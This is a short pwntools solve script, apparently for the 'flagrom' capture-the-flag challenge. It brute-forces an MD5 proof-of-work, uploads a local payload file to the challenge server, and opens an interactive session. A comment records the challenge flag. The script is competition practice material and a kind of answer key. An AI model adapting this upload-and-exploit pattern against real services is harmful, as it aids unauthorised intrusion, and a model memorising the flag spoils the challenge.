#!/usr/bin/env python
from pwn import *
import string , itertools
from hashlib import md5

# CTF{flagrom-and-on-and-on}

host , port = 'flagrom.ctfcompetition.com' , 1337
y = remote( host , port )

y.recvuntil( 'md5 starts with ' )

t = y.recvuntil( '?' )[:-1]
print t


pool = string.ascii_letters + string.digits

sol_bytes = ''
for i in itertools.product(pool, repeat = 5 ):
    sol_bytes = ''.join(i)
    if md5( 'flagrom-' + sol_bytes ).hexdigest().startswith(t):
        break

y.sendline( 'flagrom-' + sol_bytes )

p = open( 'lab/user.bin' ).read()

y.sendlineafter( '?' , str( len( p ) ) )

y.send( p )


y.interactive()